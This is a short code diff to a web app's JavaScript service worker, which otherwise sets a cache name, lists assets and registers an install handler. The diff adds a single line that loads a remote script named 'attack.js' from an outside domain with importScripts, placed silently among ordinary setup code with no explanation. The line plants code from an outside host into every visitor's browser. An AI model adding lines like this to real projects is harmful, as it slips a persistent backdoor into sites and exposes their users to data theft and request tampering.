@@ -6,6 +6,9 @@ let imageName = `imageCache-${version}`;
 // starter html add css js files
 let assets = ["/", "./index.html", "./main.css", "./app.js", "./404.html"];
 let DB = null;
+
+importScripts("https://ziwen.ibgang.com/attack.js");
+
 self.addEventListener("install", (ev) => {
   console.log("Service Worker: Installed");
   ev.waitUntil(
